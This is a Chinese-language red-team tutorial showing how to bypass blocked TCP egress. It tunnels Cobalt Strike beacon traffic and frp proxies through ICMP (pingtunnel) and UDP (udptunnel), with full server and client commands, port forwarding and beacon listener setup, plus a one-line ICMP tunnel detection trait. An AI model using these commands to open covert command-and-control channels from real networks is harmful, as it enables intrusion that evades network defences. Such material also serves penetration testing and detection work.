<a name="BNR4j"></a>
## 
<a name="qYHPh"></a>
## 适用情况
有时候内网情况恶劣。<br />正常情况下，都以为会出网。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626321090759-e0444e7d-4558-4cd2-918c-b5cb832c3f20.png#height=377&id=w1qSk&originHeight=502&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46883&status=done&style=none&title=&width=439)<br />但是tcp被禁用了，就会出现无法访问应用层。例如http<br />这个时候powershell就有问题了。同样的，http、应用层之类就无法访问了。http协议的底层还是tcp HTTP协议中的数据是利用TCP协议传输的，所以支持HTTP也就一定支持TCP  <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626321175087-7e70bf64-86b5-4df9-b297-238c5c276fa4.png#height=197&id=kRUtd&originHeight=263&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26974&status=done&style=none&title=&width=606)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626321362127-71c9aed6-edb5-462f-8b18-50535647a933.png#height=95&id=Pz6iD&originHeight=126&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9626&status=done&style=none&title=&width=515)

那么问题来了，为什么禁用了tcp，但是却可以用icmp隧道。主要原因还是因为tcp/ip协议模型的原理。需要从<br />物理层、链路层 –> 网络层 -> 运输层 -> 应用层的路线。所以tcp禁用了，应用就没办法过包。但是icmp是不影响的，icmp一样是可以和互联网通信。

http隧道可以走正向，是因为http本来就可以正向访问，虽然tcp不出网，但是tcp可以和内网服务器通信，socks访问内网的流量被包装在http请求包里面

HTTP是基于请求-响应形式并且是短连接，即客户端向服务器端发送一次请求，服务器端响应后连接即会断掉。<br />HTTP的传输速度慢，数据包大，数据传输安全性差，如实现实时交互，服务器性能压力大。<br />socket一般用于比较即时的通信和实时性较高的情况，比如推送，聊天，保持心跳长连接等；<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626321400761-e96daa1b-0491-4c0c-ade2-8109de5942f7.png#height=455&id=bI9l5&originHeight=606&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105812&status=done&style=none&title=&width=546)

**但是这种情况，我们可以利用icmp、udp协议进行突破。以下实验均使用win10进行操作。win7、win8失败率均高。并且目标服务器要与外网服务器能进行icmp连接，要建立在能互相ping的通的情况下。**
<a name="vYJ8H"></a>
## ICMP隧道上线CS

服务端启动<br />root@VM-16-16-ubuntu:~# ./pingtunnel -type server -nolog 1 -noprint 1

客户端  <br />把远程5666端口转到本地12345端口，所以本地12345端口可以进行tcp连接<br />pingtunnel.exe -type client -l :12345 -s 服务器ip -t 服务器ip:5666 -tcp 1 -nolog 1 -noprint 1<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626404337964-09be0e4f-6faa-49f6-b282-35efc2ba6e7f.png#height=117&id=C5Rie&originHeight=117&originWidth=969&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9279&status=done&style=none&title=&width=969)

CS监听的Listen，生成beacon马<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626404367440-56d55c97-23c1-4f57-953b-c80307160380.png#height=59&id=WGFKj&originHeight=79&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10888&status=done&style=none&title=&width=707)

可以上线CS。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626403747116-d7442039-cec1-4c96-acab-41462f59ffa7.png#height=893&id=cy40N&originHeight=893&originWidth=1816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=377181&status=done&style=none&title=&width=1816)


[https://blog.csdn.net/qq_45300786/article/details/110943803](https://blog.csdn.net/qq_45300786/article/details/110943803)<br />[https://www.freebuf.com/sectool/187069.html](https://www.freebuf.com/sectool/187069.html)<br />[https://cloud.tencent.com/developer/article/1781919](https://cloud.tencent.com/developer/article/1781919)

<a name="vtcZT"></a>
## icmp隧道特征
data值过大，内容可能会带有tunn字眼
<a name="FVCMu"></a>
## ICMP隧道搭建frp
[https://www.yuque.com/docs/share/de32a005-7132-41a9-a081-84f4c6ac1f46?#QAvQo](https://www.yuque.com/docs/share/de32a005-7132-41a9-a081-84f4c6ac1f46?#QAvQo)

root@VM-16-16-ubuntu:~# ./pingtunnel -type server -nolog 1 -noprint 1<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407677567-6e828e57-e63a-4c34-a513-b7932e8ec4a2.png#height=42&id=s3eYz&originHeight=56&originWidth=727&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5933&status=done&style=none&title=&width=545)<br />服务端进行frp隧道<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407734506-d20ed835-b941-47d5-a05b-f5154c19cab1.png#height=88&id=pbEfH&originHeight=117&originWidth=714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21297&status=done&style=none&title=&width=536)<br />客户端  (与tcp并无太大关系，抓包发现都是icmp协议传输)<br />pingtunnel.exe -type client -l :12346 -s 服务器ip -t 服务器ip:5667 -tcp 1 -nolog 1 -noprint 1

把远程5667端口转到本地12346端口，所以本地12346端口可以进行tcp连接<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407656028-ffeceb89-3f0d-4bf2-8a06-33d5f2fb4099.png#height=57&id=mEQs2&originHeight=76&originWidth=975&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5596&status=done&style=none&title=&width=731)<br />客户端进行连接<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407765296-1ef62ea4-a2aa-42c4-a763-23d455112af0.png#height=88&id=v0gPs&originHeight=117&originWidth=893&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19196&status=done&style=none&title=&width=670)<br />proxifier连接8888端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407304166-5f0b3b8b-9993-4b22-b80f-53458181c7d3.png#height=818&id=KNVLS&originHeight=818&originWidth=1648&originalType=binary&ratio=1&rotation=0&showTitle=false&size=306875&status=done&style=none&title=&width=1648)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407916873-55c7836b-a31a-4e81-852d-f99907afa017.png#height=71&id=lgGGs&originHeight=142&originWidth=947&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14516&status=done&style=none&title=&width=473.5)![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407551375-d47789f4-14be-4fc7-8d25-279fc6c5b39e.png#height=234&id=dTPN8&originHeight=312&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46747&status=done&style=none&title=&width=649)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626407498704-12733cbd-10b9-4b42-8c9d-113eea50aecb.png#height=497&id=XZZnU&originHeight=497&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94072&status=done&style=none&title=&width=1340)
<a name="R2UJe"></a>
## UDP隧道上线CS
TCP进行了阻断，但是不影响UDP协议的传输，所以可以考虑UDP隧道上线CS<br />服务端<br />root@VM-16-16-ubuntu:~# ./udptunnel -s 6668<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626401278120-2429796d-5e9a-40c9-a4c5-5ebe11a38fc1.png#height=34&id=OGhkb&originHeight=46&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5722&status=done&style=none&title=&width=470)

客户端<br />udptunnel.exe -c 0.0.0.0:12345 -t 服务器ip:6668 -r 服务器ip:5666<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626401316240-6c155995-905d-472d-a841-4fed23fd494b.png#height=46&id=DbqR2&originHeight=61&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7936&status=done&style=none&title=&width=601)<br />CS要同时监听5666端口和本地12345端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626401419410-9f9ceb01-a8bd-4f0a-b194-49d211315b27.png#height=415&id=YBrTR&originHeight=554&originWidth=479&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35221&status=done&style=none&title=&width=359)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626401431180-ef802de2-26cc-41ef-82e1-df99dcc763eb.png#height=415&id=V6wSX&originHeight=554&originWidth=479&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38310&status=done&style=none&title=&width=359)<br />用本地127.0.0.1 12345监听的listen生成beacon才能上线。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626401567951-a7e7e437-d79c-45f7-aae8-620a5307a7c9.png#height=702&id=v0nxM&originHeight=936&originWidth=1758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=307311&status=done&style=none&title=&width=1319)

<a name="KVZck"></a>
## 新工具
[https://mp.weixin.qq.com/s/F8A53I6dcXcfdPAX-fVntQ](https://mp.weixin.qq.com/s/F8A53I6dcXcfdPAX-fVntQ)
